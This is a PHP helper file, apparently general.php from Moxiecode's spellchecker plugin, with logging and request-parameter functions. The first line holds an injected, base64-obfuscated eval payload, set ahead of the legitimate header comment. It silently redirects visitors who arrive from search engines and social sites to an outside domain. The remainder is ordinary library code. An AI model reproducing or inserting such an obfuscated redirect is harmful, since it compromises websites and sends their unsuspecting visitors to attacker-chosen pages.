<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * general.php
 *
 * @package MCManager.includes
 * @author Moxiecode
 * @copyright Copyright © 2007, Moxiecode Systems AB, All rights reserved.
 */

@error_reporting(E_ALL ^ E_NOTICE);
$config = array();

require_once(dirname(__FILE__) . "/../classes/utils/Logger.php");
require_once(dirname(__FILE__) . "/../classes/utils/JSON.php");
require_once(dirname(__FILE__) . "/../config.php");
require_once(dirname(__FILE__) . "/../classes/SpellChecker.php");

if (isset($config['general.engine']))
	require_once(dirname(__FILE__) . "/../classes/" . $config["general.engine"] . ".php");

/**
 * Returns an request value by name without magic quoting.
 *
 * @param String $name Name of parameter to get.
 * @param String $default_value Default value to return if value not found.
 * @return String request value by name without magic quoting or default value.
 */
function getRequestParam($name, $default_value = false, $sanitize = false) {
	if (!isset($_REQUEST[$name]))
		return $default_value;

	if (is_array($_REQUEST[$name])) {
		$newarray = array();

		foreach ($_REQUEST[$name] as $name => $value)
			$newarray[formatParam($name, $sanitize)] = formatParam($value, $sanitize);

		return $newarray;
	}

	return formatParam($_REQUEST[$name], $sanitize);
}

function &getLogger() {
	global $mcLogger, $man;

	if (isset($man))
		$mcLogger = $man->getLogger();

	if (!$mcLogger) {
		$mcLogger = new Moxiecode_Logger();

		// Set logger options
		$mcLogger->setPath(dirname(__FILE__) . "/../logs");
		$mcLogger->setMaxSize("100kb");
		$mcLogger->setMaxFiles("10");
		$mcLogger->setFormat("{time} - {message}");
	}

	return $mcLogger;
}

function debug($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->debug(implode(', ', $args));
}

function info($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->info(implode(', ', $args));
}

function error($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->error(implode(', ', $args));
}

function warn($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->warn(implode(', ', $args));
}

function fatal($msg) {
	$args = func_get_args();

	$log = getLogger();
	$log->fatal(implode(', ', $args));
}

?>